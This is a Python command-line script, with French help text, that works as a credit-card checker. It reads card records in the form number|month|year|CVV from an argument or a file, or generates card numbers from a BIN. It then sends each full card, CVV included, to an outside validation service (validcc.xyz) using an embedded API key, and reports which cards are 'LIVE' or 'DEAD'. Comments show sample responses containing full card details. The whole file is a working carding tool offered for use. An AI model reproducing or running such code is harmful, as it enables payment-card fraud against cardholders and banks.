from urllib.request import urlopen, Request
from json import loads
import re
import argparse
from cc_valid import gen_cc
from time import sleep
cc_re = re.compile(r'\d{15,16}[\|]\d{2}[\|]\d{2,4}[\|]\d{3,4}')

api_url = "http://validcc.xyz/api/?key=YWxpZXJtYWNfNDM4MTE4Mg==&cc="
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}

# {'code': 'success', 'type': 'master', 'card': '5466160420783944|07|20|037', 'status': 'LIVE'}
# {'code': 'success', 'type': 'master', 'card': '5466160241775392|10|2022|755', 'card_status': 'DEAD'}


def checkcard(card=""):
    print('called checkcard')
    try:
        if len(cc_re.findall(card)) > 0:
            cc = cc_re.findall(card)[0]
            response = loads(urlopen(Request(f"{api_url}{cc}", headers=headers)).read())
            return f"{response['card']} {response['status']}"
            return response
        else:
            return 'invalid card'
    except Exception as e:
        try:
            return f"{response['card']} {response['card_status']}"
        except Exception as e:
            return response


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--filename', type=str,
                        default='', help='Nom du fichier a convertir')
    parser.add_argument('-cc', '--creditcard', type=str,
                        default='', help='CCNUM|MM|YY|CVV')
    parser.add_argument('-b', '--cc_bin', type=str,
                        default='', help='bin a utiliser pour la generation')
    parser.add_argument('-n', '--number', type=str,
                        default='', help='nombre de catre a generer')
    cards = []
    args = parser.parse_args()
    if args.creditcard:
        try:
            cc_infos = cc_re.findall(args.creditcard)
            for c in cc_infos:
                cards.append(c)
        except Exception as e:
            print(e)
            pass
    if args.filename:
        try:
            with open(args.filename, 'r') as ccfile:
                rawdata = ccfile.read()
            cards = cc_re.findall(rawdata)
        except Exception as e:
            raise e
    if args.cc_bin:
        try:
            num = int(args.number)
            bn = args.cc_bin
            # BIN = bn[:6]
            cards = gen_cc(bin=bn, num=num, month=11, year=24)

        except Exception:
            bn = args.cc_bin
            BIN = bn[:6]
            cards = gen_cc(bin=bn, num=10)

    for cc in cards:
        print(checkcard(card=cc))
        sleep(0.5)
